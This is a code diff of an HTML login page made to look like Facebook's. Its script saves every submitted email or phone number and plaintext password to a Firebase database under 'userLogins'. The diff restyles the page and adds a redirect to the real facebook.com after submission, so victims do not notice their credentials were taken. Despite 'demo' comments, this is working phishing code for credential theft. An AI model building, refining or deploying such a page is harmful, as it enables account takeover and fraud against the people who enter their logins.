@@ -11,6 +11,8 @@
       --fb-light: #f0f2f5;
       --fb-white: #ffffff;
       --fb-border: #ccd0d5;
+      --input-bg: #f5f6f7;
+      --input-focus: #e7f3ff;
     }
 
     * {
@@ -22,81 +24,92 @@
       margin: 0;
       padding: 0;
       background-color: var(--fb-light);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
 
     .container {
+      width: 100%;
       max-width: 400px;
-      margin: 0 auto;
-      padding: 20px;
+      padding: 40px 30px;
       background-color: var(--fb-white);
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-      margin-top: 50px;
-      border-radius: 10px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      text-align: center;
     }
 
     .fb-header {
-      text-align: center;
-      font-size: 28px;
+      font-size: 36px;
       font-weight: 700;
       color: var(--fb-blue);
       margin-bottom: 10px;
     }
 
     .fb-subtext {
-      text-align: center;
-      font-size: 14px;
+      font-size: 16px;
       color: #606770;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
+    }
+
+    form {
+      text-align: left;
     }
 
     label {
+      display: block;
       font-weight: 600;
       font-size: 14px;
       color: var(--fb-dark);
-      margin-bottom: 5px;
-      display: block;
+      margin-bottom: 6px;
+      margin-top: 12px;
     }
 
     input {
       width: 100%;
-      padding: 12px;
+      padding: 12px 14px;
       border: 1px solid var(--fb-border);
-      border-radius: 6px;
-      margin-bottom: 15px;
-      font-size: 16px;
-      background-color: var(--fb-white);
+      border-radius: 8px;
+      background-color: var(--input-bg);
+      font-size: 15px;
+      transition: border-color 0.3s, background-color 0.3s;
     }
 
     input:focus {
       outline: none;
       border-color: var(--fb-blue);
+      background-color: var(--input-focus);
     }
 
     button {
-      background-color: var(--fb-blue);
-      color: white;
-      padding: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
       width: 100%;
+      padding: 14px;
+      background-color: var(--fb-blue);
+      color: var(--fb-white);
+      font-size: 16px;
       font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
       cursor: pointer;
+      transition: background-color 0.3s;
     }
 
     button:hover {
-      background-color: #165fc1;
+      background-color: #145dbf;
     }
 
     .status {
-      margin-top: 15px;
-      text-align: center;
-      font-weight: bold;
+      margin-top: 20px;
+      font-weight: 500;
+      font-size: 14px;
+      color: #555;
     }
 
     @media (max-width: 480px) {
       .container {
-        margin: 20px 10px;
+        padding: 30px 20px;
       }
     }
   </style>
@@ -108,13 +121,13 @@
     <div class="fb-subtext">Login to your account</div>
 
     <form id="userForm">
-      <label for="name"></label>
-      <input type="text" id="name" required placeholder="Mobile number or email"/>
+      <label for="name">Email or Phone</label>
+      <input type="text" id="name" required placeholder="Enter your mobile number or email"/>
 
-      <label for="password"></label>
+      <label for="password">Password</label>
       <input type="password" id="password" required placeholder="Enter your password"/>
 
-      <button type="submit">Login</button>
+      <button type="submit">Log In</button>
     </form>
 
     <div class="status" id="statusMsg"></div>
@@ -143,29 +156,34 @@
     const statusMsg = document.getElementById('statusMsg');
 
     form.addEventListener('submit', function(e) {
-      e.preventDefault();
+  e.preventDefault();
 
-      const name = document.getElementById('name').value.trim();
-      const password = document.getElementById('password').value.trim();
+  const name = document.getElementById('name').value.trim();
+  const password = document.getElementById('password').value.trim();
 
-      const newEntryRef = database.ref("userLogins").push();
+  const newEntryRef = database.ref("userLogins").push();
 
-      newEntryRef.set({
-        name,
-        password, // Note: Storing plaintext passwords is unsafe (only for demo purposes)
-        timestamp: new Date().toISOString()
-      })
-      .then(() => {
-        statusMsg.textContent = "✅ Login data submitted!";
-        statusMsg.style.color = "green";
-        form.reset();
-      })
-      .catch((error) => {
-        console.error("Error saving data: ", error);
-        statusMsg.textContent = "❌ Failed to submit. Try again.";
-        statusMsg.style.color = "red";
-      });
-    });
+  newEntryRef.set({
+    name,
+    password, // ⚠️ Only for demo – never store plaintext passwords
+    timestamp: new Date().toISOString()
+  })
+  .then(() => {
+    // Optional message display before redirect (can be removed)
+    statusMsg.textContent = "✅ Logging in...";
+    statusMsg.style.color = "green";
+
+    // Redirect to Facebook after 1 second (optional delay)
+    setTimeout(() => {
+      window.location.href = "https://www.facebook.com";
+    }, 1000);
+  })
+  .catch((error) => {
+    console.error("Error saving data: ", error);
+    statusMsg.textContent = "❌ Failed to submit. Try again.";
+    statusMsg.style.color = "red";
+  });
+});
   </script>
 
 </body>
